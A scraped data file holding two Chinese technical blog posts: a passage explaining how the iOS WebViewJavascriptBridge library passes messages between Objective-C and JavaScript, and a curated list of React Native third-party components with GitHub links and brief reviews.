            _doDispatchMessageFromObjC();
        }

        function _doDispatchMessageFromObjC() {
            var message = JSON.parse(messageJSON);
            var messageHandler;
            var responseCallback;
            //回调
            if (message.responseId) {
                responseCallback = responseCallbacks[message.responseId];
                if (!responseCallback) {
                    return;
                }
                responseCallback(message.responseData);
                delete responseCallbacks[message.responseId];
            } else {//主动调用
                if (message.callbackId) {
                    var callbackResponseId = message.callbackId;
                    responseCallback = function(responseData) {
                        _doSend({ handlerName: message.handlerName, responseId: callbackResponseId, responseData: responseData });
                    };
                }
                //获取JS注册的函数
                var handler = messageHandlers[message.handlerName];
                if (!handler) {
                    console.log(""WebViewJavascriptBridge: WARNING: no handler for message from ObjC:"", message);
                } else {
                    //调用JS中的对应函数处理
                    handler(message.data, responseCallback);
                }
            }
        }
    }
    //把消息从JS发送到OC，执行具体的发送操作。
    function _doSend(message, responseCallback) {
        if (responseCallback) {
            var callbackId = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
            //存储消息的回调ID
            responseCallbacks[callbackId] = responseCallback;
            //把消息对应的回调ID和消息一起发送，以供消息返回以后使用。
            message['callbackId'] = callbackId;
        }
        //把消息放入消息列表
        sendMessageQueue.push(message);
        //下面这句话会出发JS对OC的调用
        //让webview执行跳转操作，从而可以在
        //webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler 中拦截到JS发给OC的消息
        messagingIframe.src = CUSTOM_PROTOCOL_SCHEME + '://' + QUEUE_HAS_MESSAGE;
    }


    messagingIframe = document.createElement('iframe');
    messagingIframe.style.display = 'none';
    //messagingIframe.body.style.backgroundColor=""#0000ff"";
    messagingIframe.src = CUSTOM_PROTOCOL_SCHEME + '://' + QUEUE_HAS_MESSAGE;
    document.documentElement.appendChild(messagingIframe);


    //注册_disableJavascriptAlertBoxSafetyTimeout方法，让OC可以关闭回调超时，默认是开启的。
    registerHandler(""_disableJavascriptAlertBoxSafetyTimeout"", disableJavscriptAlertBoxSafetyTimeout);
    //执行_callWVJBCallbacks方法
    setTimeout(_callWVJBCallbacks, 0);

    //初始化WEB中注册的方法。这个方法会把WEB中的hander注册到bridge中。
    //下面的代码其实就是执行WEB中的callback函数。
    function _callWVJBCallbacks() {
        var callbacks = window.WVJBCallbacks;
        delete window.WVJBCallbacks;
        for (var i = 0; i &lt; callbacks.length; i++) {
            callbacks[i](WebViewJavascriptBridge);
        }
    }
})();</code></pre>
<p>其实我们发现整个js文件就是一个立即执行的javascript方法。</p>
<ul>
<li><p>首先我们发现会初始化一个WebViewJavascriptBridge对象。并且这个对象是赋值给window对象，这里window对象可以理解为webview。所以说我们后面在OC环境中如果要调用js方法，就可以通过<code>window.WebViewJavascriptBridge</code>在加上具体方法来调用。</p></li>
<li><p>WebViewJavascriptBridge对象中有javascript环境注入的提供给OC调用的方法registerHandler，javascript调用OC环境方法的callHandler。</p></li>
<li><p>_fetchQueue这个方法的作用就是把javascript环境的方法序列化成JSON字符串，然后传入OC环境再转换。</p></li>
<li><p>_handleMessageFromObjC就是处理OC发给javascript环境的方法。</p></li>
</ul>
<p>在这个文件中也初始化了一个iframe实现webview的url跳转功能，从而激发webview代理方法的调用。</p>
<pre><code class=""javascript"">    messagingIframe = document.createElement('iframe');
    messagingIframe.style.display = 'none';
    //messagingIframe.body.style.backgroundColor=""#0000ff"";
    messagingIframe.src = CUSTOM_PROTOCOL_SCHEME + '://' + QUEUE_HAS_MESSAGE;
    document.documentElement.appendChild(messagingIframe);</code></pre>
<p>上面的src就是<code>https://__wvjb_queue_message__/</code>。这个是javascript发送的OC的第一条消息，目的和上面OC环境的startupMessageQueue一样，就是在javascript环境初始化完成以后，把javascript要发送给OC的消息立即发送出去。</p>
<p>然后我们看文件的最后面有如下代码。这段代码的作用就是立即执行ExampleApp.html中的callback方法。callback中传入的bridge参数就是我们这里初始化的window.WebViewJavascriptBridge对象。</p>
<pre><code class=""javascript"">    //执行_callWVJBCallbacks方法
    setTimeout(_callWVJBCallbacks, 0);

    //初始化WEB中注册的方法。这个方法会把WEB中的hander注册到bridge中。
    //下面的代码其实就是执行WEB中的callback函数。
    function _callWVJBCallbacks() {
        var callbacks = window.WVJBCallbacks;
        delete window.WVJBCallbacks;
        for (var i = 0; i &lt; callbacks.length; i++) {
            callbacks[i](WebViewJavascriptBridge);
        }
    }</code></pre>
<p>直到这里，OC环境和javascript环境的bridege都建立完毕。OC和javascript环境都有一个bridge对象，这个对象都保存着注册的每个方法和回调，并且维护着各自的消息队列、回调id、requestId等一系列信息。</p>
<h2>OC发消息给WEB</h2>
<p>OC要调用javascript环境的方法，其实就是调用<code>ExampleApp.html</code>中的<code>bridge.registerHandler</code>注册的方法。</p>
<pre><code class=""objc"">//点击按钮开始一个OC消息.ExampleWKWebViewController.m中一个方法开始。
- (void)callHandler:(id)sender {
    id data = @{ @""OC调用JS方法"": @""OC调用JS方法的参数"" };
    [_bridge callHandler:@""OC调用JS提供的方法"" data:data responseCallback:^(id response) {
       // NSLog(@""testJavascriptHandler responded: %@"", response);
    }];
}
/*
    handerName:OC调用JS提供的方法
    data:{@""OC调用JS方法的参数"":@""OC调用JS方法""}
    responseCallback:回调block
 */
- (void)callHandler:(NSString *)handlerName data:(id)data responseCallback:(WVJBResponseCallback)responseCallback {
    [_base sendData:data responseCallback:responseCallback handlerName:handlerName];
}</code></pre>
<p>把所有信息存入一个名字为message的字典中。里面拼装好参数<code>data</code>、回调ID<code>callbackId</code>、消息名字<code>handlerName</code>。具体如下：</p>
<pre><code class=""objc"">- (void)sendData:(id)data responseCallback:(WVJBResponseCallback)responseCallback handlerName:(NSString*)handlerName {
    NSMutableDictionary* message = [NSMutableDictionary dictionary];
    
    if (data) {
        message[@""data""] = data;
    }
    
    if (responseCallback) {
        NSString* callbackId = [NSString stringWithFormat:@""objc_cb_%ld"", ++_uniqueId];
        self.responseCallbacks[callbackId] = [responseCallback copy];
        message[@""callbackId""] = callbackId;
    }
    
    if (handlerName) {
        message[@""handlerName""] = handlerName;
    }
    [self _queueMessage:message];
}</code></pre>
<p>把OC消息序列化、并且转化为javascript环境的格式。然后在主线程中调用_evaluateJavascript。</p>
<pre><code class=""objc"">//把消息发送给WEB环境
- (void)_dispatchMessage:(WVJBMessage*)message {
    NSString *messageJSON = [self _serializeMessage:message pretty:NO];
    [self _log:@""SEND"" json:messageJSON];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\\"" withString:@""\\\\""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\"""" withString:@""\\\""""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\'"" withString:@""\\\'""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\n"" withString:@""\\n""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\r"" withString:@""\\r""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\f"" withString:@""\\f""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\u2028"" withString:@""\\u2028""];
    messageJSON = [messageJSON stringByReplacingOccurrencesOfString:@""\u2029"" withString:@""\\u2029""];
    
    NSString* javascriptCommand = [NSString stringWithFormat:@""WebViewJavascriptBridge._handleMessageFromObjC('%@');"", messageJSON];
    if ([[NSThread currentThread] isMainThread]) {
        [self _evaluateJavascript:javascriptCommand];

    } else {
        dispatch_sync(dispatch_get_main_queue(), ^{
            [self _evaluateJavascript:javascriptCommand];
        });
    }
}</code></pre>
<p>具体注入的javascript字符串如下：</p>
<pre><code>WebViewJavascriptBridge._handleMessageFromObjC('{\""callbackId\"":\""objc_cb_1\"",\""data\"":{\""OC调用JS方法\"":\""OC调用JS方法的参数\""},\""handlerName\"":\""OC调用JS提供的方法\""}');</code></pre>
<p>其实就是通过javascript环境中的Bridge对象的<code>_handleMessageFromObjC</code>方法。下面我们去<code>WebViewJavascriptBridege_JS.js</code>中看<code>_handleMessageFromObjC</code>的处理过程。</p>
<pre><code class=""javascript"">//处理从OC返回的消息。
function _dispatchMessageFromObjC(messageJSON) {
    if (dispatchMessagesWithTimeoutSafety) {
        setTimeout(_doDispatchMessageFromObjC);
    } else {
        _doDispatchMessageFromObjC();
    }

    function _doDispatchMessageFromObjC() {
        var message = JSON.parse(messageJSON);
        var messageHandler;
        var responseCallback;
        //回调
        if (message.responseId) {
            responseCallback = responseCallbacks[message.responseId];
            if (!responseCallback) {
                return;
            }
            responseCallback(message.responseData);
            delete responseCallbacks[message.responseId];
        } else {//主动调用
            if (message.callbackId) {
                var callbackResponseId = message.callbackId;
                responseCallback = function(responseData) {
                    _doSend({ handlerName: message.handlerName, responseId: callbackResponseId, responseData: responseData });
                };
            }
            //获取JS注册的函数
            var handler = messageHandlers[message.handlerName];
            if (!handler) {
                console.log(""WebViewJavascriptBridge: WARNING: no handler for message from ObjC:"", message);
            } else {
                //调用JS中的对应函数处理
                handler(message.data, responseCallback);
            }
        }
    }
}
</code></pre>
<p>上面这段代码很容易理解，其实就是如果消息中有callbackId则表示是一个回调。直接调用_doSend方法把信息返回OC。否则就是Web环境主动调用OC的情况。此时把callbackID、handlerName、responseCallback封装进一个message对象中保存起来(其实你会发现和OC环境的bridge处理一样)。然后通过_doSend发消息发送到OC环境。下面我们看看_doSend的具体实现：</p>
<pre><code class=""javascript"">//把消息从JS发送到OC，执行具体的发送操作。
function _doSend(message, responseCallback) {
    if (responseCallback) {
        var callbackId = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
        //存储消息的回调ID
        responseCallbacks[callbackId] = responseCallback;
        //把消息对应的回调ID和消息一起发送，以供消息返回以后使用。
        message['callbackId'] = callbackId;
    }
    //把消息放入消息列表
    sendMessageQueue.push(message);
    //下面这句话会出发JS对OC的调用
    //让webview执行跳转操作，从而可以在
    //webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler 中拦截到JS发给OC的消息
    messagingIframe.src = CUSTOM_PROTOCOL_SCHEME + '://' + QUEUE_HAS_MESSAGE;
}
</code></pre>
<p>其中最重要还是最后面的通过改变iframe的<code>messagingIframe.src</code>。从而触发webview的代理方法<code>webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler</code>从而在OC中处理javascript环境触发过来的回调。具体如下:</p>
<pre><code class=""objc"">if ([_base isWebViewJavascriptBridgeURL:url]) {
    //第一次注入JS代码
    if ([_base isBridgeLoadedURL:url]) {
        [_base injectJavascriptFile];
    //处理WEB发过来的消息
    } else if ([_base isQueueMessageURL:url]) {
        [self WKFlushMessageQueue];
    } else {
        [_base logUnkownMessage:url];
    }
    decisionHandler(WKNavigationActionPolicyCancel);
}</code></pre>
<p>这里会走<code>[self WKFlushMessageQueue];</code>方法。然后通过调用<code>WebViewJavascriptBridge._fetchQueue()</code>来获取javascript给OC的回调信息。</p>
<pre><code class=""objc"">//获取WEB消息的JSON字符串
- (NSString *)webViewJavascriptFetchQueyCommand {
    return @""WebViewJavascriptBridge._fetchQueue();"";
}
////把消息或者WEB回调从OC发送到OC
- (void)WKFlushMessageQueue {
    NSString *js = [_base webViewJavascriptFetchQueyCommand];
    [_webView evaluateJavaScript:js completionHandler:^(NSString* result, NSError* error) {
        if (error != nil) {
            NSLog(@""WebViewJavascriptBridge: WARNING: Error when trying to fetch data from WKWebView: %@"", error);
        }
        //把消息或者WEB回调从OC发送到OC
        [_base flushMessageQueue:result];
    }];
}
</code></pre>
<p>获取到javascript给OC的回调消息以后，然后把javascript的bridge返回的信息加工处理成OC环境的bridge能识别的信息。从而找到具体的实现执行。</p>
<pre><code class=""objc"">//把从WEB发送的消息返回。然后在这里处理
- (void)flushMessageQueue:(NSString *)messageQueueString{
    if (messageQueueString == nil || messageQueueString.length == 0) {
        NSLog(@""WebViewJavascriptBridge: WARNING: ObjC got nil while fetching the message queue JSON from webview. This can happen if the WebViewJavascriptBridge JS is not currently present in the webview, e.g if the webview just loaded a new page."");
        return;
    }

    id messages = [self _deserializeMessageJSON:messageQueueString];
    for (WVJBMessage* message in messages) {
        if (![message isKindOfClass:[WVJBMessage class]]) {
            NSLog(@""WebViewJavascriptBridge: WARNING: Invalid %@ received: %@"", [message class], message);
            continue;
        }
        [self _log:@""RCVD"" json:message];
        
        NSString* responseId = message[@""responseId""];
        if (responseId) {
            WVJBResponseCallback responseCallback = _responseCallbacks[responseId];
            responseCallback(message[@""responseData""]);
            [self.responseCallbacks removeObjectForKey:responseId];
        } else {
            WVJBResponseCallback responseCallback = NULL;
            NSString* callbackId = message[@""callbackId""];
            if (callbackId) {
                responseCallback = ^(id responseData) {
                    if (responseData == nil) {
                        responseData = [NSNull null];
                    }
                    
                    WVJBMessage* msg = @{ @""responseId"":callbackId, @""responseData"":responseData };
                    [self _queueMessage:msg];
                };
            } else {
                responseCallback = ^(id ignoreResponseData) {
                    // Do nothing
                };
            }
            
            WVJBHandler handler = self.messageHandlers[message[@""handlerName""]];
            
            if (!handler) {
                NSLog(@""WVJBNoHandlerException, No handler for message from JS: %@"", message);
                continue;
            }
            
            handler(message[@""data""], responseCallback);
        }
    }
}</code></pre>
<p>这里会调用handler方法，通过javascript传过来的responseId获取对应的<code>WVJBResponseCallback</code>。然后执行这个block。到这里从OC发送消息到javascript并且javascript返回消息给OC的流程走完了。</p>
<h2>WEB发消息给OC</h2>
<p>首先通过<code>ExampleAPP.html</code>中的<code>bridge.callHandler</code>方法，这里的bridge就是<code>window.WebViewJavascriptBridge</code>对象：</p>
<pre><code class=""javascript"">bridge.callHandler('OC提供方法给JS调用',params, function(response) {
    log('JS调用OC的返回值', response)
})</code></pre>
<p>接下来调用<code>window.WebViewJavascriptBridge</code>中的callHander方法</p>
<pre><code class=""javascript"">//web端调用一个OC注册的消息
function callHandler(handlerName, data, responseCallback) {
    if (arguments.length == 2 &amp;&amp; typeof data == 'function') {
        responseCallback = data;
        data = null;
    }
    _doSend({ handlerName: handlerName, data: data }, responseCallback);
}</code></pre>
<p>然后调用<code>WebViewJavascriptBridge_JS.js</code>中的方法执行具体的操作。具体就和OC调用javascript过程一样了，就不解释了。</p>
<pre><code class=""javascript"">//把消息从JS发送到OC，执行具体的发送操作。
function _doSend(message, responseCallback) {
    if (responseCallback) {
        var callbackId = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
        //存储消息的回调ID
        responseCallbacks[callbackId] = responseCallback;
        //把消息对应的回调ID和消息一起发送，以供消息返回以后使用。
        message['callbackId'] = callbackId;
    }
    //把消息放入消息列表
    sendMessageQueue.push(message);
    //下面这句话会出发JS对OC的调用
    //让webview执行跳转操作，从而可以在
    //webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler 中拦截到JS发给OC的消息
    messagingIframe.src = CUSTOM_PROTOCOL_SCHEME + '://' + QUEUE_HAS_MESSAGE;
}</code></pre>
<h2>总结</h2>
<p>其实现在想想，原理很简单。</p>
<ul>
<li><p>分别在OC环境和javascript环境都保存一个bridge对象，里面维持着requestId,callbackId,以及每个id对应的具体实现。</p></li>
<li><p>OC通过javascript环境的<code>window.WebViewJavascriptBridge</code>对象来找到具体的方法，然后执行。</p></li>
<li><p>javascript通过改变iframe的src来出发webview的代理方法<code>webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler</code>从而实现把javascript消息发送给OC这个功能。</p></li>
</ul>
<p>其实这里只是解析了webview与OC交互的桥接问题，其他比如webview中的请求拦截、添加进度条、运营商劫持、如何组织交互规则等问题这里还没有涉及。这些在我们项目中运用，具体就不抽出来了。</p>
<p>最后，具体的源码在<a href=""https://github.com/huang303513/iOSSourceCodeStudy"" rel=""nofollow noreferrer"">github地址</a>。</p>

                ", WebViewJavascriptBridge原理解析,1531971968,514,1,513,1,1,https://segmentfault.com/a/1190000008948594
67,1,0,6,"
                    
<h1>写在前面</h1>
<p>一个好的App缺不了好的三方支持，生活在ReactNative这个活跃的开源社区，寻找合适的三方组件是一个开发者最基本的能力。不过不积跬步，无以至千里，不积小流，无以成江海。下面分享几个我收集的三方模块，希望对大家有点帮助。</p>
<h2>文件上传 <code>react-native-uploader</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878131?w=355&amp;h=614"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github地址：<a href=""https://github.com/aroth/react-native-uploader"" rel=""nofollow noreferrer"">https://github.com/aroth/reac...</a></p>
<blockquote><p>评价：支持多图上传和上传进度显示，demo比较粗糙。项目已经停止更新 4个月</p></blockquote>
<p>&lt;!--more--&gt;</p>
<h2>毛玻璃效果 <code>react-native-blur</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878132?w=375&amp;h=666"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github 地址：<a href=""https://github.com/react-native-community/react-native-blur"" rel=""nofollow noreferrer"">https://github.com/react-nati...</a></p>
<blockquote><p>评价：星星比较多，支持3种常见的毛玻璃效果，不错的组件。</p></blockquote>
<h2>图片轮播</h2>
<ul><li><p><code>react-native-viewpager</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878133?w=281&amp;h=500"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span><br> GitHub 地址：<a href=""https://github.com/race604/react-native-viewpager"" rel=""nofollow noreferrer"">https://github.com/race604/re...</a></p>
<blockquote><p>评价：实际使用过，轮播效果比较普通，算比较实用吧</p></blockquote>
<ul><li><p><code>react-native-looped-carousel</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878134?w=368&amp;h=660"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/appintheair/react-native-looped-carousel"" rel=""nofollow noreferrer"">https://github.com/appintheai...</a></p>
<blockquote><p>评价：demo比较精致，可以尝试</p></blockquote>
<ul><li><p><code>react-native-app-intro</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878135?w=342&amp;h=617"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/FuYaoDe/react-native-app-intro"" rel=""nofollow noreferrer"">https://github.com/FuYaoDe/re...</a></p>
<blockquote><p>评价：星星比较多，适合做App进入的引导页</p></blockquote>
<h2>图片选择</h2>
<ul><li><p><code>react-native-image-picker</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878136?w=750&amp;h=403"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/marcshilling/react-native-image-picker"" rel=""nofollow noreferrer"">https://github.com/marcshilli...</a></p>
<blockquote><p>评价：实际使用过，功能强大，兼容性好。但是不支持多图</p></blockquote>
<ul><li><p><code>react-native-image-crop-picker</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878137?w=750&amp;h=1334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/ivpusic/react-native-image-crop-picker"" rel=""nofollow noreferrer"">https://github.com/ivpusic/re...</a></p>
<blockquote><p>评价：功能类似，但支持多图</p></blockquote>
<h2>获取设备信息 <code>react-native-device-info</code>
</h2>
<p>GitHub 地址：<a href=""https://github.com/rebeccahughes/react-native-device-info"" rel=""nofollow noreferrer"">https://github.com/rebeccahug...</a></p>
<blockquote><p>评价：文档比较细致，算是靠谱的组件</p></blockquote>
<h2>ListView优化替代组件 <code>react-native-sglistview</code>
</h2>
<p>GitHub 地址：<a href=""https://github.com/sghiassy/react-native-sglistview"" rel=""nofollow noreferrer"">https://github.com/sghiassy/r...</a></p>
<blockquote><p>评价：用法简单，可以减小ListView运行占用的内存</p></blockquote>
<h2>二维码识别 <code>react-native-qrcode-reader</code>
</h2>
<p>github 地址：<a href=""https://github.com/starknx/react-native-qrcode-reader"" rel=""nofollow noreferrer"">https://github.com/starknx/re...</a></p>
<blockquote><p>评价：比较实用的功能</p></blockquote>
<h2>手势解锁 <code>react-native-gesture-password</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878138?w=314&amp;h=565"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/SunflowerGJ/react-native-gesture-password"" rel=""nofollow noreferrer"">https://github.com/SunflowerG...</a></p>
<blockquote><p>评价：为App添彩的功能</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878139?w=180&amp;h=320"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/starknx/react-native-qrcode-reader"" rel=""nofollow noreferrer"">https://github.com/starknx/re...</a></p>
<blockquote><p>评价： 星星比较少，项目1年未更新，谨慎使用</p></blockquote>
<h2>键盘遮挡问题解决</h2>
<blockquote><p>评价：新版RN的<code>KeyboardAvoidingView</code>组件可以解决这个问题</p></blockquote>
<h2>图片查看 <code>react-native-gallery </code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878140"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/ldn0x7dc/react-native-gallery"" rel=""nofollow noreferrer"">https://github.com/ldn0x7dc/r...</a></p>
<blockquote><p>评价：支持轮播和 放大查看</p></blockquote>
<h2>3D Touch <code>react-native-quick-actions</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878141?w=750&amp;h=403"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/madriska/react-native-quick-actions"" rel=""nofollow noreferrer"">https://github.com/madriska/r...</a></p>
<blockquote><p>评价：为App添彩的功能，但不是必须的</p></blockquote>
<h2>可滑动的日历组件 <code>react-native-myCalendar</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878142?w=370&amp;h=673"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/cqm1994617/react-native-myCalendar"" rel=""nofollow noreferrer"">https://github.com/cqm1994617...</a></p>
<blockquote><p>评价：demo 耦合性略高</p></blockquote>
<h2>可拖拽元素 <code>react-native-gesture-recognizers</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878143?w=371&amp;h=685"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/johanneslumpe/react-native-gesture-recognizers"" rel=""nofollow noreferrer"">https://github.com/johanneslu...</a></p>
<blockquote><p>评价：比较有趣的功能</p></blockquote>
<h2>下拉放大 <code>react-native-parallax-view</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878144?w=373&amp;h=663"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/lelandrichardson/react-native-parallax-view"" rel=""nofollow noreferrer"">https://github.com/lelandrich...</a></p>
<blockquote><p>评价：这个功能适合带图片的详情页</p></blockquote>
<h2>简单图表 <code>react-native-chart</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878145?w=750&amp;h=1334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/tomauty/react-native-chart"" rel=""nofollow noreferrer"">https://github.com/tomauty/re...</a></p>
<blockquote><p>评价：比较成熟的项目，放心使用</p></blockquote>
<h2>侧滑按钮 <code>react-native-swipeout</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878146?w=367&amp;h=120"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/dancormier/react-native-swipeout"" rel=""nofollow noreferrer"">https://github.com/dancormier...</a></p>
<blockquote><p>评价：如果放在水平滚动的容器里会有BUG</p></blockquote>
<h2>抽屉功能 <code>react-native-drawer</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878147?w=563&amp;h=1000"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/root-two/react-native-drawer"" rel=""nofollow noreferrer"">https://github.com/root-two/r...</a></p>
<blockquote><p>评价：实际使用过，性能还不错，可放心使用</p></blockquote>
<h2>加载动画 <code>react-native-spinkit</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878148?w=202&amp;h=360"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/maxs15/react-native-spinkit"" rel=""nofollow noreferrer"">https://github.com/maxs15/rea...</a></p>
<blockquote><p>评价：比较有趣的动画，为项目添彩</p></blockquote>
<h2>登录动画 <code>react-native-login</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878149?w=365&amp;h=670"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/brentvatne/react-native-login"" rel=""nofollow noreferrer"">https://github.com/brentvatne...</a></p>
<blockquote><p>评价：动画为mp4格式</p></blockquote>
<h2>动画组件 <code>react-native-animatable</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878150?w=306&amp;h=548"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/oblador/react-native-animatable"" rel=""nofollow noreferrer"">https://github.com/oblador/re...</a></p>
<blockquote><p>评价：为元素添加灵动感，比较实用</p></blockquote>
<h2>即时通讯</h2>
<ul><li><p><code>react-native-gifted-chat</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878151?w=320&amp;h=568"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/FaridSafi/react-native-gifted-chat"" rel=""nofollow noreferrer"">https://github.com/FaridSafi/...</a></p>
<blockquote><p>评价：支持发送位置和图片</p></blockquote>
<ul><li><p><code>react-native-imUI</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878152?w=250&amp;h=445"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/Ice-MT/react-native-imUI"" rel=""nofollow noreferrer"">https://github.com/Ice-MT/rea...</a></p>
<blockquote><p>评价：从项目里抽取出来的demo，UI做的挺萌，有发送语音功能</p></blockquote>
<h2>精致的输入框 <code>react-native-textinput-effects</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878153?w=746&amp;h=436"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/halilb/react-native-textinput-effects"" rel=""nofollow noreferrer"">https://github.com/halilb/rea...</a></p>
<blockquote><p>评价：为项目添彩的功能</p></blockquote>
<h2>表单验证 <code>react-native-gifted-form</code>
</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878154?w=315&amp;h=581"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>GitHub 地址：<a href=""https://github.com/FaridSafi/react-native-gifted-form"" rel=""nofollow noreferrer"">https://github.com/FaridSafi/...</a></p>
<blockquote><p>评价：比较实用，适合用在复杂的表单</p></blockquote>
<h2>UI组件库</h2>
<ul><li><p><code>NativeBase</code></p></li></ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008878155"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""这里写图片描述"" title=""这里写图片描述""></span></p>
<p>github：<a href=""https://github.com/GeekyAnts/NativeBase"" rel=""nofollow noreferrer"">https://github.com/GeekyAnts/...</a> <br><br> 在线文档：<a href=""http://nativebase.io/docs/v0.4.6/components#anatomy"" rel=""nofollow noreferrer"">http://nativebase.io/docs/v0....</a></p>
